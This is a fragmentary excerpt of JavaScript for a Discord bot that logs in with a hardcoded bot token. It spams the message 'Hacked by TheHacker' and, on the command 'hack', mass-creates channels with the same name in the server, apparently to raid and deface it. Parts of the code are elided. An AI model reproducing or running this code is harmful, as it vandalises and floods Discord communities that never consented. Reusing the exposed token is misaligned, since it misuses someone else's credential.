...
client.login("NDE1NjIwMTE0MTg1MTkxNDI0.DW4pTQ.F-9j01f-3zKB-n0IgagZ93EhdVE");
...
client.on("message", function(message) {
            ...
            message.channel.sendMessage("Hacked by TheHacker")
            message.channel.sendMessage("Hacked by TheHacker")
            message.channel.sendMessage("Hacked by TheHacker")
            message.channel.sendMessage("Hacked by TheHacker")
            message.channel.sendMessage("Hacked by TheHacker")
...
if (message.content === 'hack') {
      if (message.channel.guild) {
        message.channel.guild.createChannel('hacked_by_thehacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked_by_thehacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked by TheHacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked by TheHacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked by TheHacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked by TheHacker', 'text').then(console.log);
        message.channel.guild.createChannel('hacked by TheHacker', 'text').then(console.log);
